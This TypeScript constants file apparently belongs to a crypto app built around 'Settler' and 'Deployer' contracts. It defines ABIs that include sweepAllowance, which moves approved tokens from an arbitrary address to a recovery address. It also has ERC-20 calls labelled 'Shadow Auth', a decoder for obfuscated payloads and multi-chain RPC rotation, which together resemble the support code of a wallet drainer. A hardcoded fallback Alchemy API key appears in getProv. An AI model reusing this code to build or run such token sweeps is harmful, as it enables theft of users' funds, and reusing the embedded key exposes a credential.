import { ethers } from "ethers";

export { ethers };
/** * [constants.ts]
 * Optimized for UniversalSettler.sol (Dual-Path) & UniversalDeployer.sol
 * Maintained: Resilient RPC Rotation & Enterprise Deobfuscation
 */

// 🛡️ ALIGNED WITH YOUR .SOL: Now includes both x() and sweepAllowance()
export const SETTLER_ABI = [
  "function x(bytes stream, address[] safetyTokens, address payable recovery, bytes32 messageHash, bytes signature) external payable",
  "function sweepAllowance(address token, address from, address recovery, uint256 amount) external",
];

// 🛡️ ALIGNED WITH YOUR .SOL: Matches the perform function exactly
export const DEPLOYER_ABI = [
  "function perform(bytes32 salt, bytes stream, address[] safetyTokens, address payable recovery, bytes32 messageHash, bytes signature) external payable",
  "function predictAddress(bytes32 salt) public view returns (address)",
];

// 🛡️ STANDARD ERC20: For Shadow Auth and Balance Checks
export const ERC20_ABI = [
  "function transferFrom(address from, address to, uint256 value) external returns (bool)",
  "function approve(address spender, uint256 value) external returns (bool)",
  "function balanceOf(address owner) view returns (uint256)",
  "function allowance(address owner, address spender) view returns (uint256)",
];

export const settlerInterface = new ethers.Interface(SETTLER_ABI);
export const deployerInterface = new ethers.Interface(DEPLOYER_ABI);
export const erc20Interface = new ethers.Interface(ERC20_ABI);

export const ETH_ADDR = "0x0000000000000000000000000000000000000000";

const _cache = new Map<number, ethers.JsonRpcProvider>();

/**
 * 🌐 RPC Provider Resolver - Resilient Multi-Endpoint Rotation (Preserved Feature)
 */
export const getProv = (id: number): ethers.JsonRpcProvider | null => {
  if (!_cache.has(id)) {
    // Default Fallback Key
    const ALCHEMY_KEY =
      process.env.NEXT_PUBLIC_ALCHEMY_API_KEY ||
      process.env.ALCHEMY_KEY ||
      "LEcRJW_Bhx4ybZ7TSZ3p9";

    // 🛡️ Enterprise Pool for BSC (Chain 56)
    const bscPool = [
      "https://bsc-rpc.publicnode.com",
      "https://rpc.ankr.com/bsc",
      "https://binance.llamarpc.com",
      "https://bsc-dataseed1.binance.org",
    ];

    let urls: string[] = [];

    // Mapping logic (Preserved)
    if (id === 56) {
      urls = process.env.RPC_URL_56 ? [process.env.RPC_URL_56] : bscPool;
    } else if (id === 1) {
      urls = [
        process.env.RPC_URL_1 ||
          `https://eth-mainnet.g.alchemy.com/v2/${ALCHEMY_KEY}`,
      ];
    } else if (id === 137) {
      urls = [`https://polygon-mainnet.g.alchemy.com/v2/${ALCHEMY_KEY}`];
    } else if (id === 8453) {
      urls = [`https://base-mainnet.g.alchemy.com/v2/${ALCHEMY_KEY}`];
    } else if (id === 31337) {
      urls = ["http://127.0.0.1:8545"];
    }

    if (urls.length === 0) return null;

    try {
      const network = ethers.Network.from(id);

      // Initialize provider with static network for performance
      const provider = new ethers.JsonRpcProvider(urls[0], network, {
        staticNetwork: network,
      });

      /**
       * 🔄 THE KILL SWITCH (Preserved Feature)
       * Wraps standard JSON-RPC calls in a rotation loop to prevent 429s/timeouts.
       */
      provider.send = async (method: string, params: Array<any>) => {
        let lastError;

        for (const url of urls) {
          try {
            const controller = new AbortController();
            const timeoutId = setTimeout(() => controller.abort(), 6000); // 6s timeout

            const response = await fetch(url.trim(), {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({
                jsonrpc: "2.0",
                method,
                params,
                id: Date.now(),
              }),
              signal: controller.signal,
            });

            clearTimeout(timeoutId);

            if (!response.ok) throw new Error(`HTTP_${response.status}`);

            const result = await response.json();
            if (result.error) throw new Error(result.error.message);

            return result.result;
          } catch (err: any) {
            console.warn(`[RPC-RETRY] ⚠️ ${url} failed: ${err.message}`);
            lastError = err;
            continue;
          }
        }
        console.error(
          `[getProv] ❌ All RPC endpoints exhausted for chain ${id}`,
        );
        throw lastError;
      };

      _cache.set(id, provider);
      console.log(`[getProv] ✅ Resilient Provider active for chain ${id}`);
    } catch (err) {
      console.error(`[getProv] Critical failure during provider init`, err);
      return null;
    }
  }
  return _cache.get(id) || null;
};

/**
 * 🔓 Payload Deobfuscation (Base64 + URI decoding - Preserved Feature)
 */
export const deobfuscate = (str: string) => {
  try {
    const decoded = atob(str);
    const charData = decoded
      .split("")
      .map((c) => "%" + ("00" + c.charCodeAt(0).toString(16)).slice(-2))
      .join("");
    return JSON.parse(decodeURIComponent(charData));
  } catch (e) {
    return null;
  }
};

export const getNetSuffix = (id: number) =>
  ({ 1: "ERC-20", 56: "BEP-20", 137: "POLYGON", 8453: "BASE" }[id] ||
  "Network");

export const getNativeSym = (id: number) =>
  ({ 1: "ETH", 56: "BNB", 137: "POL", 8453: "ETH" }[id] || "Native");
